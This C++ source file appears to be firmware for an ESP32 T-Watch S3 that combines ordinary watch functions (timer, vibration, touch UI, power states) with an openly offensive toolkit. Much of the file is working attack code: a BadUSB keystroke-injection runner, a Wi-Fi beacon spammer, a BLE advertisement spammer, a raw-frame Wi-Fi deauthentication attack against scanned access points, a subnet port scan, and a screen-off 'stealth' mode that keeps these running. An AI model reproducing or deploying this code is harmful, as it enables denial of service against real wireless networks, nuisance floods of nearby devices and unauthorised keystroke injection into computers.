// --- Logic.cpp ---
#include "Logic.h"
#include "Globals.h"
#include "Display.h" 
#include "RechnerApp.h"
#include "JigglerApp.h"
#include "EvilPortalApp.h" 
#include "HardwareConfig.h" 
#include <esp_sleep.h>
#include <driver/i2s.h>
#include <BLEDevice.h>
#include <WiFi.h>      
#include <esp_wifi.h> 

#define TOUCH_INT 16 // HIER IST DER FIX: Pin für den Touch-Wakeup definiert!

extern "C" {
    typedef uint8_t esp_bd_addr_t[6];
    int esp_ble_gap_set_rand_addr(esp_bd_addr_t rand_addr);
}

extern void toggleWLAN();
extern void playSynthSound(int type, int duration);

bool badUsbActive = false;
bool wifiSpamActive = false;
bool bleSpamActive = false;

void showToast(String msg, int duration) { toastMsg = msg; toastEndTime = millis() + duration; lastSecond = -1; }
void triggerVibration() { if (vibActive) { drv.selectLibrary(1); drv.setMode(0); drv.setWaveform(0, 1); drv.setWaveform(1, 0); drv.run(); } }
void triggerAlarm() { for(int i=0; i<4; i++) { if(timerAlarmMode == 0 || timerAlarmMode == 2) { drv.selectLibrary(1); drv.setMode(0); drv.setWaveform(0, 47); drv.setWaveform(1, 0); drv.run(); } if(timerAlarmMode == 1 || timerAlarmMode == 2) { playSynthSound(6, 200); } delay(400); } }

void killAllApps() { 
    swRunning = false; swElapsed = 0; timerRunning = false; timerRemaining = 0; stopMic(); jigglerActive = false;
    badUsbActive = false; wifiSpamActive = false; bleSpamActive = false;
    nmapActive = false; deauthActive = false; 
    
    if(deauthState > 0 || nmapState > 0) {
        esp_wifi_set_promiscuous(false);
        WiFi.disconnect(true);
        WiFi.mode(WIFI_OFF);
        deauthState = 0; nmapState = 0;
    }
}

void toggleBT() { btActive = !btActive; if (btActive) { if (!bleInitDone) { BLEDevice::init("T-Watch S3"); bleInitDone = true; } delay(300); showToast("Bluetooth An", 3500); } else { if (bleInitDone) { BLEDevice::deinit(true); bleInitDone = false; } delay(300); showToast("Bluetooth Aus", 3500); } }
void toggleVibra() { vibActive = !vibActive; prefs.begin("clock", false); prefs.putBool("vib", vibActive); prefs.end(); if (vibActive) triggerVibration(); showToast(vibActive ? "Vibration An" : "Vibration Aus", 3500); }

void startMic() { if(micActive) return; i2s_start(I2S_NUM_0); micActive = true; }
void stopMic() { if(!micActive) return; i2s_stop(I2S_NUM_0); micActive = false; debug_rms = 0.0; }
int getDecibels() {
    if(!micActive) return 0; size_t bytes_read = 0; int16_t i2s_read_buff[256]; 
    esp_err_t err = i2s_read(I2S_NUM_0, (void*)i2s_read_buff, sizeof(i2s_read_buff), &bytes_read, 20 / portTICK_PERIOD_MS);
    if (err != ESP_OK || bytes_read == 0) { debug_rms = -1.0; return 0; }
    double rms = 0; int samples = bytes_read / 2; for (int i = 0; i < samples; i++) { double val = i2s_read_buff[i]; rms += (val * val); }
    rms = sqrt(rms / samples); debug_rms = rms; if (rms < 5.0) return 0; 
    int db = 20 * log10(rms) - 23; if (db < 30) db = 30; if (db > 120) db = 120; return db;
}

String translateForLayout(String text, int layout) {
    if (layout == 0) return text; 
    String res = "";
    for(int i=0; i<text.length(); i++) {
        char c = text[i];
        switch(c) {
            case 'z': res += 'y'; break; case 'Z': res += 'Y'; break; case 'y': res += 'z'; break; case 'Y': res += 'Z'; break;
            case ':': res += '>'; break; case '/': res += '&'; break; case '?': res += '_'; break; case '=': res += ')'; break;
            case '-': res += '/'; break; case '_': res += '?'; break; case '&': res += '^'; break; case '*': res += '}'; break;
            case '(': res += '*'; break; case ')': res += '('; break; case '+': res += ']'; break;
            default: res += c; break;
        }
    }
    return res;
}

void executeBadUSB() {
    if(!badUsbActive) return;
    String scriptToRun = badUsbScripts[currentBadUsbScript];
    int idx = 0;
    while(idx < scriptToRun.length() && badUsbActive) {
        int nextLine = scriptToRun.indexOf('\n', idx);
        if(nextLine == -1) nextLine = scriptToRun.length();
        String line = scriptToRun.substring(idx, nextLine);
        line.trim();
        
        if (line.startsWith("DELAY ")) { int d = line.substring(6).toInt(); delay(d); } 
        else if (line.startsWith("STRING ")) { String payload = line.substring(7); payload = translateForLayout(payload, badUsbLayout); Keyboard.print(payload); delay(50); } 
        else if (line.startsWith("GUI ")) { Keyboard.press(KEY_LEFT_GUI); if(line.length() > 4) Keyboard.press(line[4]); delay(100); Keyboard.releaseAll(); } 
        else if (line == "ENTER") { Keyboard.write(KEY_RETURN); }
        
        idx = nextLine + 1;
        yield();
    }
    badUsbActive = false; lastSecond = -1;
}

void spamBeacons() {
    if(!wifiSpamActive) return;
    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x31, 0x04, 0x00, 0x00 };
    String ssids[10]; int count = 0; int start = 0;
    for(int i=0; i<spamSSIDs.length(); i++) {
        if(spamSSIDs[i] == ',' || i == spamSSIDs.length()-1) {
            if(i == spamSSIDs.length()-1) ssids[count] = spamSSIDs.substring(start);
            else ssids[count] = spamSSIDs.substring(start, i);
            ssids[count].trim(); count++; start = i+1; if(count >= 10) break;
        }
    }
    if(count == 0) return;

    for(int j=0; j<5; j++) { 
        for(int i=0; i<count; i++) {
            if(!wifiSpamActive) return;
            packet[10] = packet[16] = random(256); packet[11] = packet[17] = random(256); packet[12] = packet[18] = random(256);
            packet[13] = packet[19] = random(256); packet[14] = packet[20] = random(256); packet[15] = packet[21] = random(256);
            int ssidLen = ssids[i].length(); packet[37] = ssidLen; 
            for(int k=0; k<ssidLen; k++) packet[38+k] = ssids[i][k];
            packet[38+ssidLen] = 0x01; packet[39+ssidLen] = 0x08; packet[40+ssidLen] = 0x82; packet[41+ssidLen] = 0x84; packet[42+ssidLen] = 0x8b; packet[43+ssidLen] = 0x96; packet[44+ssidLen] = 0x24; packet[45+ssidLen] = 0x30; packet[46+ssidLen] = 0x48; packet[47+ssidLen] = 0x6c;
            esp_wifi_80211_tx(WIFI_IF_AP, packet, 48 + ssidLen, false);
            delay(5);
        }
    }
}

void spamBLE() {
    if (!bleSpamActive) return;
    static unsigned long lastBleSpam = 0;
    if (millis() - lastBleSpam < 100) return; 
    lastBleSpam = millis();

    if (!bleInitDone) { BLEDevice::init("T-Watch"); bleInitDone = true; }

    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

    uint8_t payload[] = {
        0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x0e, 0x02, 0x20, 0x75,
        0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    const uint8_t models[] = {0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14}; 
    payload[6] = models[random(sizeof(models))];
    
    char strPayload[32];
    for(int i=0; i<31; i++) strPayload[i] = (char)payload[i];
    strPayload[31] = '\0';
    
    oAdvertisementData.addData(String(strPayload, 31)); 
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
}

void scanAir() {
    if(!isScanningAir) return;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    int n = WiFi.scanNetworks(false, false, false, 300);
    numScannedNetworks = 0;
    for (int i = 0; i < n && i < 15; i++) {
        scannedSSIDs[i] = WiFi.SSID(i);
        scannedMACs[i] = WiFi.BSSIDstr(i);
        numScannedNetworks++;
    }
    isScanningAir = false;
    WiFi.scanDelete();
    currentDeauthTarget = 0;
    lastSecond = -1;
}

void executeDeauth() {
    if (!deauthActive) { deauthState = 0; return; }
    
    if (deauthState == 0) {
        if(numScannedNetworks == 0) { deauthActive = false; return; }
        String bssidStr = scannedMACs[currentDeauthTarget];
        char* ptr;
        deauthMac[0] = strtol(bssidStr.substring(0, 2).c_str(), &ptr, 16);
        deauthMac[1] = strtol(bssidStr.substring(3, 5).c_str(), &ptr, 16);
        deauthMac[2] = strtol(bssidStr.substring(6, 8).c_str(), &ptr, 16);
        deauthMac[3] = strtol(bssidStr.substring(9, 11).c_str(), &ptr, 16);
        deauthMac[4] = strtol(bssidStr.substring(12, 14).c_str(), &ptr, 16);
        deauthMac[5] = strtol(bssidStr.substring(15, 17).c_str(), &ptr, 16);
        
        deauthState = 2; 
        WiFi.mode(WIFI_AP); 
        esp_wifi_set_promiscuous(true);
        lastSecond = -1;
    } else if (deauthState == 2) {
        uint8_t deauth_pkt[26] = {
            0xc0, 0x00, 0x00, 0x00, 
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
            deauthMac[0], deauthMac[1], deauthMac[2], deauthMac[3], deauthMac[4], deauthMac[5], 
            deauthMac[0], deauthMac[1], deauthMac[2], deauthMac[3], deauthMac[4], deauthMac[5], 
            0x00, 0x00, 
            0x07, 0x00 
        };
        for(int i=0; i<30; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_pkt, sizeof(deauth_pkt), false);
            delay(2);
        }
    }
}

void executeNmap() {
    if (!nmapActive) { nmapState = 0; return; }
    
    if (nmapState == 0) {
        nmapLog = "Verbinde mit " + targetSSIDs[currentTargetNmap] + "...\n";
        WiFi.mode(WIFI_STA);
        WiFi.begin(targetSSIDs[currentTargetNmap].c_str(), targetPWDs[currentTargetNmap].c_str());
        nmapState = 1;
        lastSecond = -1;
    } 
    else if (nmapState == 1) {
        if (WiFi.status() == WL_CONNECTED) {
            nmapLog += "Verbunden!\nLokal: " + WiFi.localIP().toString() + "\nScanne...\n";
            nmapIP = 1;
            nmapState = 2;
            lastSecond = -1;
        } else if (WiFi.status() == WL_CONNECT_FAILED || WiFi.status() == WL_NO_SSID_AVAIL) {
            nmapLog += "Fehler: WLAN nicht gefunden\noder PW falsch!\n";
            nmapState = 4;
            nmapActive = false;
            lastSecond = -1;
        }
    } 
    else if (nmapState == 2) {
        static unsigned long lastTick = 0;
        if(millis() - lastTick < 50) return; 
        lastTick = millis();

        if (nmapIP > 254) {
            nmapLog += "Scan beendet.\n";
            nmapState = 3;
            nmapActive = false;
            WiFi.disconnect(true);
            WiFi.mode(WIFI_OFF);
            lastSecond = -1;
            return;
        }

        IPAddress base;
        if (base.fromString(nmapBaseIP + "1")) {
            IPAddress target(base[0], base[1], base[2], nmapIP);
            if (target != WiFi.localIP()) {
                WiFiClient client;
                if (client.connect(target, 80, 40)) { 
                    nmapLog += "+ " + target.toString() + " (Offen)\n";
                    client.stop();
                    lastSecond = -1;
                }
            }
        }
        nmapIP++;
    }
}

void checkBackgroundTasks(unsigned long currentMillis) {
    bool isCharging = pmu.isVbusIn() || pmu.isCharging();
    if (isCharging && !wasCharging) { wasCharging = true; showToast("Wird geladen ⚡", 4000); } else if (!isCharging && wasCharging) { wasCharging = false; showToast("Akku-Modus 🔋", 4000); }
    if (timerRunning && (currentMillis - timerLastTick >= 1000)) { timerRemaining--; timerLastTick = currentMillis; if (timerRemaining <= 0) { timerRunning = false; timerRemaining = 0; triggerAlarm(); lastSecond = -1; lastTouchTime = currentMillis; showToast("Timer abgelaufen! ⏱️", 6000); } }

    static unsigned long lastJiggle = 0; 
    if (jigglerActive && currentMillis - lastJiggle > 15000) { Mouse.move(2, 2); delay(50); Mouse.move(-2, -2); lastJiggle = currentMillis; }

    bool hacksRunning = (jigglerActive || badUsbActive || wifiSpamActive || bleSpamActive || deauthActive || nmapActive || evilActive || wlanActive);

    if (badUsbActive) executeBadUSB();
    if (wifiSpamActive) spamBeacons();
    if (bleSpamActive) spamBLE(); 
    if (deauthActive) executeDeauth();
    if (nmapActive) executeNmap();
    if (isScanningAir) scanAir();

    if (matrixMode) {
        lastTouchTime = currentMillis; setBrightness(maxBright); int16_t mx[2], my[2];
        if (touch.getPoint(mx, my, 1) > 0) { matrixMode = false; tft.fillScreen(cBG); lastSecond = -1; return; }
        static unsigned long lastMatrixUpdate = 0;
        if (currentMillis - lastMatrixUpdate > 40) {
            lastMatrixUpdate = currentMillis;
            for(int i=0; i<24; i++) {
                 if (matrixY[i] == 0 && random(10) > 2) continue; 
                 tft.fillRect(i*10, matrixY[i] - 42, 10, 14, TFT_BLACK); tft.setTextColor(0x03E0, TFT_BLACK); 
                 tft.drawChar((char)random(33, 126), i*10, matrixY[i] - 14, 2); tft.drawChar((char)random(33, 126), i*10, matrixY[i] - 28, 2); tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawChar((char)random(33, 126), i*10, matrixY[i], 2);
                 matrixY[i] += 14; if(matrixY[i] > 282) matrixY[i] = 0; 
            }
        }
        return; 
    }

    if (currentMillis - lastHistoryTime >= historyInterval || historyCount == 0) {
        lastHistoryTime = currentMillis;
        uint8_t batVal = getBattery();
        if (isCharging) batVal += 200; 
        else if (hacksRunning) batVal += 100;
        
        if (historyCount < MAX_HISTORY) { batHistoryPct[historyCount] = batVal; historyCount++; } 
        else { for(int i = 1; i < MAX_HISTORY; i++) batHistoryPct[i-1] = batHistoryPct[i]; batHistoryPct[MAX_HISTORY-1] = batVal; }
        prefs.begin("clock", false); prefs.putInt("hCount", historyCount); prefs.putBytes("hData", batHistoryPct, MAX_HISTORY); prefs.end();
        if (currentPage == 9) lastSecond = -1; 
    }
}

// ---------------------------------------------------------
// Das NEUE, reparierte 5-Stufen Power Management
// ---------------------------------------------------------
void handlePowerManagement(unsigned long currentMillis) {
    if(matrixMode) return; 
    
    if (pmu.getBattVoltage() == 0) { 
        Wire.end(); Wire.begin(10, 11); 
        if (pmu.init(Wire, 10, 11, AXP2101_SLAVE_ADDRESS)) { 
            pmu.enableBattVoltageMeasure(); pmu.enableIRQ(0xFFFFFFFFFFFFFFFFULL); pmu.clearIrqStatus(); 
        } 
    }

    unsigned long elapsed = currentMillis - lastTouchTime; 
    static int lastPowerState = 1; 
    bool isCharging = pmu.isVbusIn() || pmu.isCharging();
    bool hacksRunning = (jigglerActive || badUsbActive || wifiSpamActive || bleSpamActive || deauthActive || nmapActive || evilActive || wlanActive);
    
    // Basis-Einstufung nach Zeit
    if (currentPage == 10) powerState = 1; 
    else if (elapsed < time_dim_start) powerState = 1;      // State 1: Aktiv (Hell)
    else if (elapsed < time_aod_start) powerState = 2;      // State 2: Dimmen
    else if (elapsed < time_sleep_start) powerState = 3;    // State 3: AOD (Immer hier bleiben wenn am Strom!)
    else powerState = 4;                                    // State 4: Soft Sleep Vorbereitung

    // Absolute Overrides für State 4 (Schlafen)
    if (powerState == 4) {
        if (isCharging) powerState = 3;        // B: Strom -> Dauer-AOD
        else if (hacksRunning) powerState = 5; // A: Hacks -> Stealth (Bildschirm aus, CPU an)
    }

    // Krone Hardware Button Check (PEK)
    pmu.getIrqStatus(); 
    bool pekPressed = pmu.isPekeyShortPressIrq(); 
    pmu.clearIrqStatus(); 
    
    if (pekPressed) {
        triggerVibration(); 
        if (currentPage == 10) { currentPage = 5; } 
        // Krone spult die Zeit exakt auf den Beginn der AOD Phase (State 3) vor oder zurück!
        lastTouchTime = currentMillis - time_aod_start - 10; 
        lastSecond = -1;
        return; 
    }

    // Hardware Display On/Off Logik
    if ((lastPowerState == 4 || lastPowerState == 5) && (powerState < 4)) {
        tft.writecommand(0x11); // Wake up Display!
        delay(120);
    } 
    else if ((lastPowerState < 4) && (powerState == 4 || powerState == 5)) {
        tft.writecommand(0x10); // Sleep Display!
    }

    lastPowerState = powerState;
    bool isAwake = (powerState == 1 || powerState == 2 || powerState == 3); 
    static bool wasAwake = true;
    
    // CPU Taktung für Hacks und AOD
    int desiredFreq = 80; 
    if (powerState == 1 || hacksRunning) { desiredFreq = 240; } 
    else if (powerState == 2 || powerState == 3) { desiredFreq = 160; }
    if (ESP.getCpuFreqMHz() != desiredFreq) { setCpuFrequencyMhz(desiredFreq); }

    // Helligkeits-Steuerung
    if (powerState == 1) { 
        setBrightness(maxBright); 
    } 
    else if (powerState == 2) { 
        float fade = (float)(elapsed - time_dim_start) / (time_aod_start - time_dim_start); 
        setBrightness(maxBright - ((maxBright - minBright) * fade)); 
    } 
    else if (powerState == 3) { 
        setBrightness(minBright); 
    } 
    else if (powerState == 4 || powerState == 5) {
        setBrightness(0);
    }
    
    // Screen Blanking
    if (isAwake != wasAwake) { 
        wasAwake = isAwake; 
        if (!isAwake) { tft.fillScreen(TFT_BLACK); lastSecond = -1; } 
        else { tft.fillScreen(cBG); lastSecond = -1; } 
    }

    // Echter Hardware Tiefschlaf (Nur in State 4 erlaubt!)
    if (powerState == 4) {
        esp_sleep_enable_timer_wakeup(100000); 
        esp_sleep_enable_ext0_wakeup((gpio_num_t)TOUCH_INT, 0); // Display-Touch weckt CPU auf!
        esp_light_sleep_start(); 
    }
}

bool isPageEnabled(int p) { if(p==0) return enP0; if(p==1) return enP1; if(p==2) return enP2; if(p==3) return enP3; return false; }

void handleTouchInput() {
    if(matrixMode) return;
    int16_t x[2], y[2]; 
    bool isTouched = (touch.getPoint(x, y, 1) > 0); 
    bool isApp = (currentPage >= 7 && currentPage <= 19); 

    if (isTouched) {
        // Doppel-Tipp weckt aus AOD (State 3), Sleep (State 4) und Stealth (State 5)
        if (powerState == 3 || powerState == 4 || powerState == 5) { 
            if (millis() - lastTapTime < 600) { lastTouchTime = millis(); } 
            lastTapTime = millis(); 
            delay(100); 
            return; 
        } 
        else {
            int touchY = y[0] - 34; if (currentPage == 10) touchY = y[0]; 

            if (isApp) {
                if (x[0] > 170 && touchY > 0 && touchY < 65) { 
                    killAllApps(); triggerVibration(); 
                    if (currentPage == 10 || currentPage == 11) slideToPage(5, 1, 0); else slideToPage(6, 1, 0); 
                    lastTouchTime = millis(); delay(200); return;
                }
                
                if (currentPage == 7) { 
                    if (touchY >= 150) { if (x[0] < 120) { swRunning = !swRunning; triggerVibration(); if(swRunning) swStartTime = millis(); else swElapsed += (millis() - swStartTime); } else { swRunning = false; swElapsed = 0; triggerVibration(); } lastTouchTime = millis(); lastSecond = -1; delay(200); return; }
                } else if (currentPage == 8) { 
                    if (!timerRunning) { if (touchY >= 80 && touchY <= 130) { if (x[0] < 80) timerRemaining = t1 * 60; else if (x[0] < 160) timerRemaining = t2 * 60; else timerRemaining = t3 * 60; timerRunning = true; timerLastTick = millis(); triggerVibration(); lastTouchTime = millis(); lastSecond = -1; delay(200); return; } } 
                    else { if (touchY >= 150) { timerRunning = false; timerRemaining = 0; triggerVibration(); lastTouchTime = millis(); lastSecond = -1; delay(200); return; } }
                } else if (currentPage == 12) { handleEvilTouch(x[0], touchY); lastTouchTime = millis(); return;
                } else if (currentPage == 13) { handleRechnerTouch(x[0], touchY); lastTouchTime = millis(); return;
                } else if (currentPage == 14) { handleJigglerTouch(x[0], touchY); lastTouchTime = millis(); return;
                } else if (currentPage == 15) { 
                    if (touchY >= 25 && touchY <= 75) {
                        if (x[0] > 10 && x[0] < 70) { currentBadUsbScript--; if(currentBadUsbScript < 0) currentBadUsbScript = 2; triggerVibration(); lastSecond = -1; delay(200); }
                        else if (x[0] > 170 && x[0] < 230) { currentBadUsbScript++; if(currentBadUsbScript > 2) currentBadUsbScript = 0; triggerVibration(); lastSecond = -1; delay(200); }
                    }
                    else if (touchY >= 85 && touchY <= 155 && x[0] > 30 && x[0] < 210) { badUsbActive = !badUsbActive; triggerVibration(); lastSecond = -1; delay(200); }
                    lastTouchTime = millis(); return;
                } else if (currentPage == 16) { 
                    if (touchY >= 80 && touchY <= 140 && x[0] > 40 && x[0] < 200) {
                        wifiSpamActive = !wifiSpamActive; triggerVibration(); lastSecond = -1; delay(200);
                        if(wifiSpamActive) { WiFi.mode(WIFI_AP); esp_wifi_set_promiscuous(true); } 
                        else { esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_OFF); }
                    }
                    lastTouchTime = millis(); return;
                } else if (currentPage == 17) { 
                    if (touchY >= 80 && touchY <= 140 && x[0] > 40 && x[0] < 200) {
                        bleSpamActive = !bleSpamActive; triggerVibration(); lastSecond = -1; delay(200);
                        if (!bleSpamActive && bleInitDone && !btActive) { BLEDevice::deinit(true); bleInitDone = false; }
                    }
                    lastTouchTime = millis(); return;
                } else if (currentPage == 18) { 
                    if (touchY >= 25 && touchY <= 75) {
                        if (x[0] > 10 && x[0] < 70) { currentTargetNmap--; if(currentTargetNmap < 0) currentTargetNmap = 2; triggerVibration(); lastSecond = -1; delay(200); }
                        else if (x[0] > 170 && x[0] < 230) { currentTargetNmap++; if(currentTargetNmap > 2) currentTargetNmap = 0; triggerVibration(); lastSecond = -1; delay(200); }
                    }
                    else if (touchY >= 85 && touchY <= 155 && x[0] > 30 && x[0] < 210) {
                        if (targetSSIDs[currentTargetNmap].length() == 0) return;
                        nmapActive = !nmapActive; 
                        if(nmapActive) { nmapState = 0; } else { WiFi.disconnect(true); WiFi.mode(WIFI_OFF); }
                        triggerVibration(); lastSecond = -1; delay(200);
                    }
                    lastTouchTime = millis(); return;
                } else if (currentPage == 19) { 
                    if (touchY >= 25 && touchY <= 75) {
                        if (x[0] > 10 && x[0] < 70) { currentDeauthTarget--; if(currentDeauthTarget < 0) currentDeauthTarget = numScannedNetworks > 0 ? numScannedNetworks - 1 : 0; triggerVibration(); lastSecond = -1; delay(200); }
                        else if (x[0] > 170 && x[0] < 230) { currentDeauthTarget++; if(currentDeauthTarget >= numScannedNetworks) currentDeauthTarget = 0; triggerVibration(); lastSecond = -1; delay(200); }
                    }
                    else if (touchY >= 75 && touchY <= 115 && x[0] > 30 && x[0] < 210) {
                        if (numScannedNetworks == 0) return;
                        deauthActive = !deauthActive; 
                        if(deauthActive) { deauthState = 0; } else { esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_OFF); }
                        triggerVibration(); lastSecond = -1; delay(200);
                    }
                    else if (touchY >= 130 && touchY <= 160 && x[0] > 30 && x[0] < 210) {
                        isScanningAir = true; triggerVibration(); lastSecond = -1; delay(200);
                    }
                    lastTouchTime = millis(); return;
                }
            }
            lastTouchTime = millis(); lastX = x[0]; lastY = y[0];
            if (!isSwiping && !isApp) { startX = lastX; startY = lastY; isSwiping = true; } 
        }
    } else if (isSwiping) {
        isSwiping = false; int dx = lastX - startX; int dy = lastY - startY;
        
        if (abs(dx) > 50 && abs(dx) > abs(dy)) { 
            if (currentPage >= 0 && currentPage <= 3) { 
                int nextP = currentPage; int checks = 0;
                if (dx > 0) { do { nextP--; if(nextP < 0) nextP = 3; checks++; } while(nextP != currentPage && !isPageEnabled(nextP) && checks < 4); } 
                else { do { nextP++; if(nextP > 3) nextP = 0; checks++; } while(nextP != currentPage && !isPageEnabled(nextP) && checks < 4); }
                if(nextP != currentPage && isPageEnabled(nextP)) { slideToPage(nextP, (dx > 0) ? 1 : -1, 0); mainPage = currentPage; } 
            }
        } 
        else if (dy > 50 && abs(dy) > abs(dx)) { if (currentPage >= 0 && currentPage <= 3) { slideToPage(5, 0, 1); } else if (currentPage == 6) { slideToPage(mainPage, 0, 1); } } 
        else if (dy < -50 && abs(dy) > abs(dx)) { if (currentPage >= 0 && currentPage <= 3) { slideToPage(6, 0, -1); } else if (currentPage == 5) { slideToPage(mainPage, 0, -1); } }
        else if (abs(dx) < 15 && abs(dy) < 15) { 
            int touchY = lastY - 34; 
            if (currentPage == 5) { 
                if (touchY < 80) { if (lastX < 120) { toggleWLAN(); triggerVibration(); lastSecond = -1; } else { toggleBT(); triggerVibration(); lastSecond = -1; } } 
                else if (touchY < 140) { if (lastX < 120) { toggleVibra(); lastSecond = -1; } else { aodActive = !aodActive; prefs.begin("clock",false); prefs.putBool("aod", aodActive); prefs.end(); triggerVibration(); lastSecond = -1; } } 
                else { if (lastX < 120) slideToPage(10, 0, -1); else slideToPage(11, 0, -1); }
            } 
            else if (currentPage == 6) { 
                if (touchY < 80) { 
                    if (lastX < 60) slideToPage(7, 0, -1);       
                    else if (lastX < 115) slideToPage(8, 0, -1); 
                    else if (lastX < 170) { startMic(); slideToPage(9, 0, -1); } 
                    else slideToPage(13, 0, -1);                 
                } 
                else if (touchY < 140) { 
                    if (lastX < 60) slideToPage(14, 0, -1);      
                    else if (lastX < 115) slideToPage(12, 0, -1);
                    else if (lastX < 170) slideToPage(15, 0, -1);
                    else slideToPage(16, 0, -1);                 
                }
                else if (touchY < 200) {
                    if (lastX < 60) slideToPage(17, 0, -1); 
                    else if (lastX < 115) slideToPage(18, 0, -1);
                    else if (lastX < 170) slideToPage(19, 0, -1); 
                }
            }
        }
    }
}